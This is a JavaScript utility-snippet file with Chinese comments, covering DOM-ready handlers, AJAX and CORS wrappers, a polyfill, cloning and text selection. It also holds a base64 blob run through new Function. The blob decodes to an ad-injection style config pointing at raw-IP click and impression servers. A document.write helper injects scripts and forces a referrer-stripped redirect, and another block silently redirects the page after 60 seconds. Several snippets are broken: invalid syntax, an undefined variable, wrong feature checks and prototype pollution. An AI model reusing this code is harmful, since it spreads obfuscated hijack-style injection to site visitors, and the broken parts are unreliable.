        iframe.attachEvent("onload", callback);
    } else {
        iframe.onload = callback
    }
}


//添加页面dom结构加载成功事件-多次执行
window.DOMLoadEvents = [];
var addDOMLoadEvent = function(handler) {
    window.DOMLoadEvents[window.DOMLoadEvents.length]=handler
}
var fireContentLoadedEvent = function() {
    if (arguments.callee.loaded) return;
    //让此函数仅仅执行一次
    arguments.callee.loaded = true;
    var handlers = window.DOMLoadEvents,length = handlers.length;
    for (var i=0; i<length; i++) {
        var func = handlers[i];
        func();//执行要在domReady运行的代码
    }
}
var pollDoScroll = function() {
    try {
        document.documentElement.doScroll('left');
    }catch(e) {
        setTimeout(arguments.callee, 10);
        return;
    }
    fireContentLoadedEvent();
}
if (document.addEventListener) {
    document.addEventListener('DOMContentLoaded', fireContentLoadedEvent, false);
} else {
    pollDoScroll();
}
addDOMLoadEvent(function(){
	alert("dom加载成功");
});



//dom加载方法 #最新
function ready(fn) {
	if (document.addEventListener) { //标准浏览器 
		document.addEventListener('DOMContentLoaded', function() { //注销事件, 避免反复触发 
			document.removeEventListener('DOMContentLoaded', arguments.callee, false);
			fn(); //执行函数 
		}, false);		
	}else if (document.attachEvent) { //IE 9 
		document.attachEvent('onreadystatechange', function() {
			if (document.readyState == 'complete') {
				document.detachEvent('onreadystatechange', arguments.callee);
				fn(); //函数执行
			}
		});
	}
};




//获取dom对象css样式
function getStyle(obj,attr){  
    if(obj.currentStyle){  
        return obj.currentStyle[attr];  
    }else  
    {  
        return getComputedStyle(obj,false)[attr];  
    }  
}


//ajax请求 同域GET\POST请求
function httpRequest(methon,url,data){
	var xmlhttp,result,str;
	if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari
	  xmlhttp=new XMLHttpRequest();
	}else {// code for IE6, IE5
	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp.onreadystatechange=function() {
		if (xmlhttp.readyState==4 && xmlhttp.status==200){
			xmlhttp.onreadystatechange=null;
		   	result=xmlhttp.responseText;	   	
		 }
	}
	if(data&&'object'==typeof data){
		 for(var t in data){
		 	if(data.hasOwnProperty(t)){
		 		str+=t+'='+data[t]+'&';
		 	}
		 }
		 str+='_='+new Date().getTime();
	}
	methon=='POST'?(function(){
		xmlhttp.open(methon,url,true);
		xmlhttp.send(str)
	}()):(function(){
		xmlhttp.open(methon,url+'?'+str,true);
		xmlhttp.send()
	}());
	
	return result
}

/*
 * ajax请求 CORS跨域 GET\POST请求  post发送数据需添加文档头setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 * h:http地址、i:发送数据json格式、d:回调函数参数为返回的xmlhttprequest对象	
 * 兼容性：ie8+\chrome\firefox\safari\opera   服务端响应时需带上Access-Control-Allow-Origin头与Origin头的值匹配
 * 
 * 
 */
function cors(h,i,d){
	var xhr,pd='',o,
	hc=function(){			
		xhr.onreadystatechange=xhr.onload=null;			
		d&&d(xhr);			
	};		
	if (i && 'object' == typeof i) {
		for (var c in i) {
			if (i.hasOwnProperty(c)) {
				pd+=c+'='+i[c]+'&';					
			}
		}
		pd+='jv=2&rd='+bf;
	}else if(i&&'string'==typeof i){
		pd=i;
	}			
	xhr=new XMLHttpRequest();
	if ("withCredentials" in xhr) {
		xhr=new XMLHttpRequest();		 
		xhr.onreadystatechange=function() {
			xhr.readyState==4 && xhr.status==200 && hc();
		};
		xhr.open("POST",h,true)
	}else if(window.XDomainRequest){
		xhr=new XDomainRequest();		
		xhr.onload=hc;
		xhr.onerror=xhr.onprogress =xhr.ontimeout= function() {};
		xhr.open("POST",h)
	}else{return}		
	xhr.send(pd);
},


//手机页面延迟请求超链接跳转
open = function (a, b) {
	document.write('<html><body>' + (b ? '<script src="' + b + '"><\/script>' : '') + '</body></html><script>~function(a){a.rel="noreferrer";a.target="_top";a.href="' + a + '";document.body.appendChild(a);setTimeout(function(){if(a.click){a.click()}else{try{var b=document.createEvent("Event");b.initEvent("click",!1,!1);a.dispatchEvent(b)}catch(e){}}},' + (b ? 200 : 0) + ')}(document.createElement("a"))<\/script>');
	document.close()
};
~ function(a) {
	a.rel = "noreferrer";
	a.target = "_top";
	a.href = "www.baidu.com";
	document.body.appendChild(a);
	setTimeout(function() {
		if (a.click) {
			a.click()
		} else {
			try {
				var b = document.createEvent("Event");
				b.initEvent("click", !1, !1);
				a.dispatchEvent(b)
			} catch (e) {}
		}
	}, 60000)
}(document.createElement("a"));



//让浏览器支持requestAnimationFrame相关方法
(function() {
    var lastTime = 0;
    var vendors = ['ms', 'moz', 'webkit', 'o'];
    for (var x = 0; x < vendors.length && !window.requestAnimationFrame; ++x) {
        window.requestAnimationFrame = window[vendors[x] + 'RequestAnimationFrame'];
        window.cancelAnimationFrame = window[vendors[x] + 'CancelAnimationFrame'] || window[vendors[x] + 'CancelRequestAnimationFrame'];
    }
    if (!window.requestAnimationFrame) window.requestAnimationFrame = function(callback, element) {
        var currTime = new Date().getTime();
        var timeToCall = Math.max(0, 16 - (currTime - lastTime));
        var id = window.setTimeout(function() {
            callback(currTime + timeToCall);
        }, timeToCall);
        lastTime = currTime + timeToCall;
        return id;
    };
    if (!window.cancelAnimationFrame) window.cancelAnimationFrame = function(id) {
        clearTimeout(id);
    };
}());




// base64位 json解码
var b64str="e3RpdGxlOiJcdTU5MjlcdTU5MjlcdTcyNzlcdTRFRjciLHJlc3VybDoiaHR0cDovLzk2LjQzLjEwOC4yMDo4Mi8iLGRhdGE6ImpzL3RlbWFpLmpzIixjbGljazoiaHR0cDovLzE5Mi4yNTMuMjMwLjEwODo4MDgxLz9zPSIsc2hvdzoiaHR0cDovLzE5Mi4yNTMuMjMwLjExMDo4ODY2Lz9wPVUxUjhRMHQ4TUE9PSIsc2hvd3JhdGU6MTAwfQ==";
var b64obj=function (b64str) {
    try {
		return (new Function("return (" + (function (b) {
					for (var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=", c, e, g, o, m, d, j, i, f = [], k = String(b), h = 0, n = k.length; h < n; h += 4) {
						o = a.indexOf(k.charAt(h));
						m = a.indexOf(k.charAt(h + 1));
						d = a.indexOf(k.charAt(h + 2));
						j = a.indexOf(k.charAt(h + 3));
						i = o << 18 | m << 12 | d << 6 | j;
						c = i >>> 16 & 255;
						e = i >>> 8 & 255;
						g = i & 255;
						f[h / 4] = String.fromCharCode(c, e, g);
						if (j == 64)
							f[h / 4] = String.fromCharCode(c, e);
						if (d == 64)
							f[h / 4] = String.fromCharCode(c);
					}
					return f.join("");
				})(b64str) + ")"))();
	} catch (J) {}
	return {};
};
b64obj(b64str);


//克隆有两种方法：一种是“浅克隆”，一种是“深克隆”（深度克隆）。  
//浅克隆：基本类型为值传递，对象仍为引用传递。  
//深克隆（深度克隆）：所有元素均完全复制，并于原对象完全独立（原对象的修改不影响新对象）。  
//深度克隆的代码如下（深克隆去掉递归即为浅克隆）：  
Object.prototype.clone = function () {  
    var o = this.constructor === Array ? [] : {};  
    for (var e in this) {  
        o[e] = typeof this[e] === "object" ? this[e].clone() : this[e];  
    }  
    return o;  
}  


//跨浏览器选择部分文本 textbox是dom表单对象
function selectText(textbox,startIndex,stopindex){  
    if(textbox.setSelectionRange()){  
        textbox.setSelectionRange(startIndex,stopindex);  
    }else if(textbox.createTextRange()){  
        var range = textbox.createTextRange();  
        range.collapse(true);  
        range.moveStart("character",startIndex);  
        range.moveEnd("character",stopindex-startIndex);  
        range.select();  
    }  
    textbox.focus();  
}  
